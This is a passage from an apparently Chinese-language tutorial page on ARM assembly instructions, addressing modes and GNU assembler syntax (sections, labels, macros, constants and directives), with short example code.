指令举例如下：<br>​        UMULL R0,R1,R5,R8 ;(R1、R0)=R5×R8</p><h4 id="UMLAL"><a href="#UMLAL" class="headerlink" title="UMLAL"></a><strong>UMLAL</strong></h4><p>​        64 位无符号乘加指令。指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​        <code>UMLAL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        UMLAL 指令举例如下：<br>​        UMLAL R0,R1,R5,R8;(R1,R0)=R5×R8+(R1,R0)</p><h4 id="SMULL"><a href="#SMULL" class="headerlink" title="SMULL"></a><strong>SMULL</strong></h4><p>​        64 位有符号乘法指令。指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​       <code>SMULL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        SMULL 指令举例如下：<br>​        SMULL R2,R3,R7,R6 ;(R3,R2)=R7×R6</p><h4 id="SMLAL"><a href="#SMLAL" class="headerlink" title="SMLAL"></a><strong>SMLAL</strong></h4><p>​        64 位有符号乘加指令。指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​       <code>SMLAL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        SMLAL 指令举例如下：<br>​        SMLAL R2,R3,R7,R6;(R3,R2)=R7×R6+(R3,R2)</p><h3 id="1-3-3-ARM-跳转指令"><a href="#1-3-3-ARM-跳转指令" class="headerlink" title="1.3.3.   ARM 跳转指令"></a>1.3.3.   ARM 跳转指令</h3><p>​     两种方式可以实现程序的跳转：</p><p>（1）     使用跳转指令直接跳转，跳转指令有跳转指令B，带链接的跳转指令BL ，带状态切换的跳转指令BX。</p><p>（2）   直接向PC 寄存器赋值实现跳转。</p><p>表A-6给出全部的ARM跳转指令。</p><p>表A-6  ARM跳转指令</p><h4 id="B"><a href="#B" class="headerlink" title="B"></a><strong>B</strong></h4><p>​        跳转指令，跳转到指定的地址执行程序。</p><pre><code>`B{cond} label`举例如下：</code></pre><p>​       <code>B WAITA ;</code>跳转到WAITA 标号处</p><p>​       <code>B 0x1234 ;</code>跳转到绝对地址0x1234 处</p><p>​        跳转到指令B 限制在当前指令的±32Mb 的范围内。</p><h4 id="BL"><a href="#BL" class="headerlink" title="BL"></a><strong>BL</strong></h4><p>带链接的跳转指令。指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序。</p><p>​        BL{cond} label</p><p>​       举例如下：</p><p>​       BL DELAY</p><p>​        跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用。</p><h4 id="BX"><a href="#BX" class="headerlink" title="BX"></a><strong>BX</strong></h4><p>带状态切换的跳转指令。跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。指令格式如下：<br>​        BX{cond} Rm<br>​       举例如下：<br>​        ADRL R0,ThumbFun+1<br>​        BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态</p><h4 id="BLX"><a href="#BLX" class="headerlink" title="BLX"></a>BLX</h4><p>​         BLX目标地址：跳转，改变状态及保存PC值</p><h3 id="1-3-4-ARM-协处理器指令"><a href="#1-3-4-ARM-协处理器指令" class="headerlink" title="1.3.4.   ARM 协处理器指令"></a>1.3.4.   ARM 协处理器指令</h3><p>5              ARM 支持协处理器操作，协处理器的控制要通过协处理器命令实现。表A-7给出全部的ARM协处理器指令。</p><p>表A-7  ARM 协处理器指令</p><h4 id="CDP"><a href="#CDP" class="headerlink" title="CDP"></a><strong>CDP</strong></h4><p>​    协处理器数据操作指令。ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​    <code>CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}</code><br>​    其中： coproc 指令操作的协处理器名。标准名为pn,n 为0～15。<br>​    opcodel 协处理器的特定操作码。<br>​    CRd 作为目标寄存器的协处理器寄存器。<br>​    CRN 存放第1 个操作数的协处理器寄存器。<br>​    CRm 存放第2 个操作数的协处理器寄存器。<br>​    Opcode2 可选的协处理器特定操作码。<br>​    CDP 指令举例如下：<br>​    CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0<br>​    CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1</p><h4 id="LDC"><a href="#LDC" class="headerlink" title="LDC"></a><strong>LDC</strong></h4><p>​        协处理器数据读取指令。LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​        <code>LDC{cond}{L} coproc,CRd,&lt;地址&gt;</code><br>​        其中： L 可选后缀，指明是长整数传送。<br>​        coproc 指令操作的协处理器名。标准名为pn，n 为0～15<br>​        CRd 作为目标寄存的协处理器寄存器。<br>​        &lt;地址&gt; 指定的内存地址<br>​        LDC 指令举例如下：<br>​        <code>LDC p5,c2,[R2,#4];</code>读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中<br>​        <code>LDC p6,c2,[R1] ;</code>读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中</p><h4 id="STC"><a href="#STC" class="headerlink" title="STC"></a><strong>STC</strong></h4><p>​        协处理器数据写入指令。STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​       <code>STC{cond}{L} coproc,CRd,&lt;地址&gt;</code><br>​        其中： L 可选后缀，指明是长整数传送。<br>​        coproc 指令操作的协处理器名。标准名为pn，n 为0～15<br>​        CRd 作为目标寄存的协处理器寄存器。<br>​        &lt;地址&gt; 指定的内存地址<br>​        STC 指令举例如下：<br>​        STC p5,c1,[R0]<br>​        STC p5,c1,[Ro,#-0x04]</p><h4 id="MCR"><a href="#MCR" class="headerlink" title="MCR"></a><strong>MCR</strong></h4><p>​        ARM寄存器到协处理器寄存器的数据传送指令。MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：<br>​       <code>MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</code><br>​        其中：coproc 指令操作的协处理器名。标准名为pn，n 为0～15。<br>​        cpcodel 协处理器的特定操作码。<br>​        RD 作为目标寄存器。<br>​        CRn 存放第1 个操作数的协处理器寄存器<br>​        CRm 存放第2 个操作数的协处理器寄存器。<br>​        Opcode2 可选的协处理器特定操作码。<br>​        MCR 指令举例如下：<br>​        MCR p6,2,R7,c1,c2,<br>​        MCR P7,0,R1,c3,c2,1,</p><h4 id="MRC"><a href="#MRC" class="headerlink" title="MRC"></a><strong>MRC</strong></h4><p>​        协处理器寄存器到ARM寄存器到的数据传送指令。MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断。指令格式如下：<br>​        <code>MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</code><br>​        其中：coproc 指令操作的协处理器名。标准名为pn，n为0～15。<br>​        opcodel 协处理器的特定操作码。<br>​        Rd 作为目标寄存器。<br>​        CRn 存放第1 个操作数的协处理器寄存器。<br>​        CRm 存放第2 个操作数的协处理器寄存器。<br>​        opcode2 可选的协处理器特定操作码。<br>​        MRC 指令举例如下：<br>​        MRC p5,2,R2,c3,c2<br>​        MRC p7,0,R0,c1,c2,1</p><h3 id="1-3-5-ARM-杂项指令"><a href="#1-3-5-ARM-杂项指令" class="headerlink" title="1.3.5.   ARM 杂项指令"></a>1.3.5.   ARM 杂项指令</h3><p>​        表A-8给出全部的ARM协处理器指令。</p><p>表A-8 ARM杂项指令</p><p><strong>SWI</strong></p><p>​        软中断指令。SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式。指令格式如下：<br>​       <code>SWI{cond} immed_24</code><br>​        其中：immed_24 24 位立即数，值为0～16777215 之间的整数。<br>​        SWI 指令举例如下：<br>​        SWI 0 ;软中断，中断立即数为0<br>​        SWI 0x123456 ;软中断，中断立即数为0x123456<br>​        使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。<br>​        （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。<br>​        MOV R0,#34     ;设置了功能号为34<br>​        SWI 12        ;调用12 号软中断<br>​        （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。<br>​        MOV R0,#12     ;调用12 号软中断<br>​        MOV R1,#34     ;设置子功能号为34<br>​        SWI 0       ;<br>​        在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。<br>​        读出SWI 立即数：<br>​        T_bit EQU 0x20<br>​        SWI_Hander<br>​        STMFD SP!,{R0_R3,R12,LR}        ;现场保护<br>​        MRS R0,SPSR                    ;读取SPSR<br>​        STMFD SP!,{R0}                    ;保存SPSR<br>​        TST R0,#T_bit                    ;测试T标志位<br>​        LDRNEH R0,[LR,#-2]                ;若是Thumb指令，读取指令码(16 位)<br>​        BICNE R0,R0,#0xFF00            ;取得Thumb 指令的8 位立即数<br>​        LDREQ R0,[LR,#-4]                ;若是ARM 指令，读取指令码(32 位)<br>​        BICNQ R0,R0,#0xFF00000            ;取得ARM 指令的24 位立即数<br>​        …<br>​        LDMFD SP!,{R0-R3,R12,PC}^ ;SWI 异常中断返回</p><h4 id="MRS"><a href="#MRS" class="headerlink" title="MRS"></a><strong>MRS</strong></h4><p>​        读状态寄存器指令。在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中。指令格式如下：<br>​        <code>MRS{cond} Rd ,psr</code><br>​        其中： Rd 目标寄存器。Rd 不允许为R15。<br>​        psr CPSR 或SPSR<br>​        MRS指令举例如下：<br>​        MRS R1,CPSR     ;将CPSR状态寄存器读取，保存到R1 中<br>​        MRS R2,SPSR     ;将SPSR状态寄存器读取，保存到R2 中<br>​        MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许/禁止IRQ/FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来。<br>​        使能IRQ 中断例程：<br>​        ENABLE_IRQ<br>​        MRS R0,CPSR<br>​        BIC R0。R0,#0x80<br>​        MSR CPSR_c,R0<br>​        MOV PC,LR<br>​        禁能IRQ 中断例程：<br>​        DISABLE_IRQ<br>​        MRS R0,CPSR<br>​        ORR R0,R0,#0x80<br>​        MSR CPSR_c,R0<br>​        MOV PC,LR</p><h4 id="MSR"><a href="#MSR" class="headerlink" title="MSR"></a><strong>MSR</strong></h4><p>​        写状态寄存器指令。在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR。指令格式如下：<br>​        <code>MSR{cond} psr_fields,#immed_8r</code><br>​        <code>MSR{cond} psr_fields,Rm</code><br>​        其中： psr CPSR 或SPSR<br>​        fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：<br>​        c 控制域屏蔽字节(psr[7…0])<br>​        x 扩展域屏蔽字节(psr[15…8])<br>​        s 状态域屏蔽字节(psr[23。…16])<br>​        f 标志域屏蔽字节(psr[31…24])<br>​        immed_8r 要传送到状态寄存器指定域的立即数，8 位。<br>​        Rm 要传送到状态寄存器指定域的数据的源寄存器。<br>​        MSR 指令举例如下：<br>​        MSR CPSR_c,#0xD3 ;CPSR[7…0]=0xD3，即切换到管理模式。<br>​        MSR CPSR_cxsf,R3 ;CPSR=R3<br>​        只有在特权模式下才能修改状态寄存器。<br>​        程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态/Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许/禁止IRQ/FIQ 中断等设置。<br>​        堆栈指令实始化例程：<br>​        INITSTACK<br>​        MOV R0,LR ;保存返回地址<br>​        ;设置管理模式堆栈<br>​        MSR CPSR_c,#0xD3<br>​        LDR SP,StackSvc<br>​                      ;设置中断模式堆栈<br>​        MSR CPSR_c,#0xD2<br>​        LDR SP,StackIrq<br>​        …</p><h3 id="1-3-6-ARM-伪指令"><a href="#1-3-6-ARM-伪指令" class="headerlink" title="1.3.6.   ARM 伪指令"></a>1.3.6.   ARM 伪指令</h3><p>​       ARM 伪指令不是ARM 指令集中的指令，只是为了编程方便编译器定义了伪指令，使用时可以像其它ARM 指令一样使用，但在编译时这些指令将被等效的ARM 指令代替。ARM伪指令有四条，分别为ADR 伪指令、ADRL 伪指令、LDR 伪指令和NOP 伪指令。</p><h4 id="ADR"><a href="#ADR" class="headerlink" title="ADR"></a><strong>ADR</strong></h4><p>​        小范围的地址读取伪指令。ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败。<br>​        ADR 伪指令格式如下：<br>​       <code>ADR{cond} register,exper</code><br>​        其中：register 加载的目标寄存器。<br>​        exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。<br>​        对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。<br>​        ADR 伪指令举例如下：<br>​        LOOP MOV R1, #0xF0<br>​        …<br>​        ADR R2, LOOP        ;将LOOP 的地址放入R2<br>​        ADR R3, LOOP+4<br>​        可以用ADR 加载地址，实现查表：<br>​        …<br>​        ADR R0,DISP_TAB     ;加载转换表地址<br>​        LDRB R1,[R0,R2]     ;使用R2作为参数，进行查表<br>​        …<br>​        DISP_TAB<br>​        DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90</p><h4 id="ADRL"><a href="#ADRL" class="headerlink" title="ADRL"></a><strong>ADRL</strong></h4><p>​        中等范围的地址读取伪指令。ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败。ADRL伪指令格式如下：<br>​        <code>ADR{cond} register,exper</code><br>​        其中：register 加载的目标寄存器。<br>​        expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。<br>​        ADRL 伪指令举例如下：<br>​        ADRL R0,DATA_BUF<br>​        …<br>​        ADRL R1 DATA_BUF+80<br>​        …<br>​        DATA_BUF<br>​        SPACE 100     ;定义100 字节缓冲区<br>​        可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：<br>​        …<br>​        ADR LR,RETURNI            ;设置返回地址<br>​        ADRL R1Thumb_Sub+1        ;取得了Thumb 子程序入口地址，且R1 的0 位置1<br>​        BX R1                    ;调用Thumb子程序，并切换处理器状态<br>​        RETURNI<br>​        …<br>​        CODE16<br>​        Thumb_Sub<br>​        MOV R1,#10<br>​        …</p><h4 id="LDR"><a href="#LDR" class="headerlink" title="LDR"></a><strong>LDR</strong></h4><p>​        大范围的地址读取伪指令。LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量。LDR 伪指令格式如下：<br>​        <code>LDR{cond} register,=expr/label_expr</code><br>​        其中：register 加载的目标寄存器<br>​        expr 32 位立即数。<br>​        label_expr 基于PC 的地址表达式或外部表达式。<br>​        LADR 伪指令举例如下：。<br>​        LDR R0,=0x123456        ;加载32 位立即数0x12345678<br>​        LDR R0,=DATA_BUF+60    ;加载DATA_BUF 地址+60<br>​        …<br>​        LTORG                    ;声明文字池<br>​        伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：<br>​        …<br>​        LDR R0,=IOPIN ;加载GPIO 寄存器IOPIN 的地址<br>​        LDR R1,[R0] ;读取IOPIN 寄存器的值<br>​        …<br>​        LDR R0,=IOSET<br>​        LDR R1,=0x00500500<br>​        STR R1,[R0] ;IOSET=0x00500500<br>​        …<br>​        从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“=”号</p><h4 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a><strong>NOP</strong></h4><p>​        空操作伪指令。NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等，NOP 伪指令格式如下：<br>​        NOP<br>​        NOP<br>​        NOP<br>​        NOP<br>​        SUBS R1, R1, #1<br>​        BNE DELAY1<br>​        …</p><h2 id="1-4-寻址方式"><a href="#1-4-寻址方式" class="headerlink" title="1.4.    寻址方式"></a>1.4.    寻址方式</h2><h3 id="1-4-1-立即数寻址"><a href="#1-4-1-立即数寻址" class="headerlink" title="1.4.1.   立即数寻址"></a>1.4.1.   立即数寻址</h3><p>立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”。</p><h3 id="1-4-2-寄存器寻址"><a href="#1-4-2-寄存器寻址" class="headerlink" title="1.4.2.   寄存器寻址"></a>1.4.2.   寄存器寻址</h3><h3 id="1-4-3-寄存器间接寻址"><a href="#1-4-3-寄存器间接寻址" class="headerlink" title="1.4.3.   寄存器间接寻址"></a>1.4.3.   寄存器间接寻址</h3><p>以寄存器中的值作为操作数的地址，而操作数本身放在存储器中。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD R0，R1，[R2]</span><br></pre></td></tr></table></figure><h3 id="1-4-4-基址变址寻址"><a href="#1-4-4-基址变址寻址" class="headerlink" title="1.4.4.   基址变址寻址"></a>1.4.4.   基址变址寻址</h3><p>将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址。</p><p>例如：<code>LDR R0，[R1，#4]  R0&lt;-[R1+4]</code></p><h3 id="1-4-5-多寄存器寻址"><a href="#1-4-5-多寄存器寻址" class="headerlink" title="1.4.5.   多寄存器寻址"></a>1.4.5.   多寄存器寻址</h3><p>一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值。</p><p><code>LDMIA  R0，{R1，R2，R3，R4}</code></p><h3 id="1-4-6-相对寻址"><a href="#1-4-6-相对寻址" class="headerlink" title="1.4.6.   相对寻址"></a>1.4.6.   相对寻址</h3><p>以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址。</p><p>例如：<code>BL NEXT;</code></p><h3 id="1-4-7-堆栈寻址"><a href="#1-4-7-堆栈寻址" class="headerlink" title="1.4.7.   堆栈寻址"></a>1.4.7.   堆栈寻址</h3><p>使用一个堆栈指针的专用寄存器指示当前操作位置</p><p>递增堆栈：向高地址方向生长</p><p>递减堆栈：向低地址方向生长</p><p>满堆栈：堆栈指针指向最后压入堆栈的有效数据</p><p>空堆栈：堆栈指针指向下一个要放入数据的空位置</p><h1 id="2-GNU-ARM混编"><a href="#2-GNU-ARM混编" class="headerlink" title="2.       GNU ARM混编"></a>2.       GNU ARM混编</h1><p>​         汇编源程序一般用于系统最基本的初始化：初始化堆栈指针、设置页表、操作 ARM的协处理器等。这些初始化工作完成后就可以跳转到C代码main函数中执行。</p><h2 id="1-1-GNU汇编语言语句格式"><a href="#1-1-GNU汇编语言语句格式" class="headerlink" title="1.1.     GNU汇编语言语句格式"></a>1.1.     GNU汇编语言语句格式</h2><p>​    任何<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">Linux</a>汇编行都是如下结构：<strong>[<label>:][<instruction or directive pseudo-instruction>} @comment</instruction></label></strong></p><p>l        instruction为指令</p><p>l        directive为伪操作</p><p>l        pseudo-instruction为伪指令</p><p>l        <strong><label>:</label></strong>为标号, GNU汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。</p><p>l        comment为语句的注释</p><p>下面定义一个”add”的函数，最终返回两个参数的和：</p><p>.section.text, “x”</p><p>.globaladd      @ give the symbol “add” externallinkage</p><p>add:</p><p>​    ADD r0, r0, r1 @ add input arguments</p><p>​    MOV pc, lr  @ return from subroutine</p><p>@ endof program</p><p>注意：</p><p>l         ARM指令，伪指令，伪操作，寄存器名可以全部为大写字母，也可全部为小写字母，但不可大小写混用。</p><p>l         如果语句太长，可以将一条语句分几行来书写，在行末用“\”表示换行（即下一行与本行为同一语句）。“\”后不能有任何字符，包含空格和制表符（Tab)。</p><h2 id="1-2-GNU汇编程序中的标号symbol（或label）"><a href="#1-2-GNU汇编程序中的标号symbol（或label）" class="headerlink" title="1.2.     GNU汇编程序中的标号symbol（或label）"></a>1.2.     GNU汇编程序中的标号symbol（或label）</h2><p>​    标号只能由a～z，A～Z，0～9，“<strong>.</strong>”，_等（由点、字母、数字、下划线等组成，除局部标号外，不能以数字开头）字符组成。</p><p>Symbol的本质：代表它所在的地址,因此也可以当作变量或者函数来使用。</p><p>l         段内标号的地址值在汇编时确定；</p><p>l         段外标号的地址值在连接时确定。</p><p>Symbol的分类：3类（依据标号的生成方式）。</p><p><strong><1></1></strong>    基于PC的标号。基于PC的标号是位于目标指令前的标号或者程序中数据定义伪操作前的标号。这种标号在汇编时将被处理成PC值加上（或减去）一个数字常量，常用于表示跳转指令<strong>”b”</strong>等的目标地址，或者代码段中所嵌入的少量数据。</p><p><strong><2></2></strong>    基于寄存器的标号。基于寄存器的标号常用MAP和FIELD来定义，也可以用EQU来定义。这种标号在汇编时将被处理成寄存器的值加上（或减去）一个数字常量，常用于访问数据段中的数据。</p><p><strong><3></3></strong>    绝对地址。绝对地址是一个32位数据。它可以寻址的范围为[0，232-1]即可以直接寻址整个内存空间。</p><p><strong>特别说明：</strong>局部标号Symbol</p><p>​    局部标号主要在局部范围内使用，而且局部标号可以重复出现。它由两部组成：开头是一个0-99直接的数字，后面紧接一个通常表示该局部变量作用范围的符号。局部变量的作用范围通常为当前段，也可以用<strong>ROUT</strong>来定义局部变量的作用范围。</p><p>​    局部变量定义的语法格式：<strong>N{routname}</strong></p><p>l         N：为0~99之间的数字。</p><p>l         routname：当前局部范围的名称（为符号），通常为该变量作用范围的名称（用ROUT伪操作定义的）。</p><p>​    局部变量引用的语法格式：<strong>%{F|B}{A|T}N{routname}</strong></p><p>l         %：表示引用操作</p><p>l         N：为局部变量的数字号</p><p>l         routname：为当前作用范围的名称（用ROUT伪操作定义的）</p><p>l         F：指示编译器只向前搜索</p><p>l         B：指示编译器只向后搜索</p><p>l         A：指示编译器搜索宏的所有嵌套层次</p><p>l         T：指示编译器搜索宏的当前层次</p><p>例：使用局部符号的例子，一段循环程序</p><p>subs r0, r0, #1 @每次循环使r0=r0-1</p><p>bne 1F      @跳转到1标号去执行</p><p>注意：</p><p>l         如果F和B都没有指定，编译器先向前搜索，再向后搜索</p><p>l         如果A和T都没有指定，编译器搜索所有从当前层次到宏的最高层次，比当前层次低的层次不再搜索。</p><p>l         如果指定了routname，编译器向前搜索最近的ROUT伪操作，若routname与该ROUT伪操作定义的名称不匹配，编译器报告错误，汇编失败。</p><h2 id="1-3-GNU汇编程序中的分段"><a href="#1-3-GNU汇编程序中的分段" class="headerlink" title="1.3.     GNU汇编程序中的分段"></a>1.3.     GNU汇编程序中的分段</h2><p><strong><1></1></strong>    .section伪操作</p><p>.section &lt;section_name&gt; {,”<flags>”}</flags></p><p>Startsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section.</p><p>Thesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable <strong>.section flags</strong> for ELF format files:</p><p><flag>     Meaning</flag></p><p>a       allowable section</p><p>w       writable section</p><p>x       executable section</p><p>中文解释：</p><p>用户可以通过.section伪操作来自定义一个段,格式如下：</p><p><strong>.section section_name [,”flags”[, %type[,flag_specific_arguments]]]</strong></p><p>  每一个段以段名为开始, 以下一个段名或者文件结尾为结束。这些段都有缺省的标志（flags），连接器可以识别这些标志。(与arm asm中的AREA相同)。下面是ELF格式允许的段标志flags：</p><p>&lt;标志&gt;     含义</p><p>a          允许段</p><p>w          可写段</p><p>x          执行段</p><p>例：定义一个“段”</p><p>.section.mysection    @自定义数据段，段名为 “.mysection”</p><p>.align  2</p><p>strtemp:</p><p>​     .ascii “Temp string \n\0” @对这一句的理解，我觉得应该是：将”Temp string \n\0”这个字符串存储在以标号strtemp为起始地址的一段内存空间里</p><p><strong><2></2></strong>    汇编系统预定义的段名</p><p>l         .text     @代码段</p><p>l         .data    @初始化数据段.data Read-write initialized long data.</p><p>l         .bss     @未初始化数据段</p><p>l         .sdata   @ .sdata Read-write initialized short data.</p><p>l         .sbss    @</p><p>注意：源程序中.bss段应该在.text段之前。</p><h2 id="1-4-GNU汇编语言定义入口点"><a href="#1-4-GNU汇编语言定义入口点" class="headerlink" title="1.4.     GNU汇编语言定义入口点"></a>1.4.     GNU汇编语言定义入口点</h2><p>汇编程序的缺省入口是<strong>_start</strong>标号，<strong>用户也可以在连接脚本文件中用ENTRY标志指明其它入口点</strong>。</p><p>例：定义入口点</p><p>.section .data</p><p>&lt; initialized data here&gt;</p><p>.section .bss</p><p>&lt; uninitialized data here&gt;</p><p>.section .text</p><p>.globl  _start</p><p>_start:</p><instruction code goes here><h2 id="1-5-GNU汇编程序中的宏定义"><a href="#1-5-GNU汇编程序中的宏定义" class="headerlink" title="1.5.     GNU汇编程序中的宏定义"></a>1.5.     GNU汇编程序中的宏定义</h2><p>格式如下：</p><p>.macro 宏名参数名列表  @伪指令.macro定义一个宏</p><p>宏体</p><p>.endm                   @.endm表示宏结束</p><p>​    如果宏使用参数,那么在宏体中使用该参数时添加前缀<strong>“\”</strong>。宏定义时的参数还可以使用默认值。可以使用.exitm伪指令来退出宏。</p><p>例：宏定义</p><p>.macroSHIFTLEFT a, b</p><p>.if \b&lt; 0</p><p>MOV \a,\a, ASR #-\b</p><p>.exitm</p><p>.endif</p><p>MOV \a,\a, LSL #\b</p><p>.endm</p><h2 id="1-6-GNU汇编程序中的常数"><a href="#1-6-GNU汇编程序中的常数" class="headerlink" title="1.6.     GNU汇编程序中的常数"></a>1.6.     GNU汇编程序中的常数</h2><p><strong><1></1></strong>    十进制数以非0数字开头,如:123和9876；</p><p><strong><2></2></strong>    二进制数以0b开头,其中字母也可以为大写；</p><p><strong><3></3></strong>    八进制数以0开始,如:0456,0123；</p><p><strong><4></4></strong>    十六进制数以0x开头,如:0xabcd,0X123f；</p><p><strong><5></5></strong>    字符串常量需要用引号括起来,中间也可以使用转义字符,如: “You are welcome!\n”；</p><p><strong><6></6></strong>    当前地址以“<strong>.</strong>”表示,在<strong>GNU</strong>汇编程序中可以使用这个符号代表当前指令的地址；</p><p><strong><7></7></strong>    表达式：在汇编程序中的表达式可以使用常数或者数值, “-”表示取负数, “~”表示取补,“&lt;&gt;”表示不相等,其他的符号如:+、-、*、/、%、&lt;、&lt;&lt;、&gt;、&gt;&gt;、|、&amp;、^、!、==、&gt;=、&lt;=、&amp;&amp;、|| 跟C语言中的用法相似。</p><h2 id="1-7-GNU-ARM汇编的常用伪操作"><a href="#1-7-GNU-ARM汇编的常用伪操作" class="headerlink" title="1.7.     GNU ARM汇编的常用伪操作"></a>1.7.     GNU ARM汇编的常用伪操作</h2><p>​    在前面已经提到过了一些为操作，还有下面一些为操作：</p><p>l         数据定义伪操作： .byte，.short，.long，.quad，.float，.string/.asciz/.ascii，重复定义伪操作.rept，赋值语句.equ/.set ；</p><p>l         函数的定义；</p><p>l         对齐方式伪操作 .align；</p><p>l         源文件结束伪操作.end；</p><p>l         .include伪操作；</p><p>l         if伪操作；</p><p>l         .global/ .globl 伪操作；</p><p>l         .type伪操作；</p><p>l         列表控制语句；</p><p>别于<strong>GNU</strong> <strong>AS</strong>汇编的通用伪操作,下面是ARM特有的伪操作：</p><p>.reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool</p><p><strong><1></1></strong>    数据定义伪操作</p><p>l        .byte:单字节定义，如：.byte 1,2,0b01,0x34,072,’s’ ；</p><p>l        .short:定义双字节数据，如:.short 0x1234,60000 ；</p><p>l        .long:定义4字节数据，如:.long 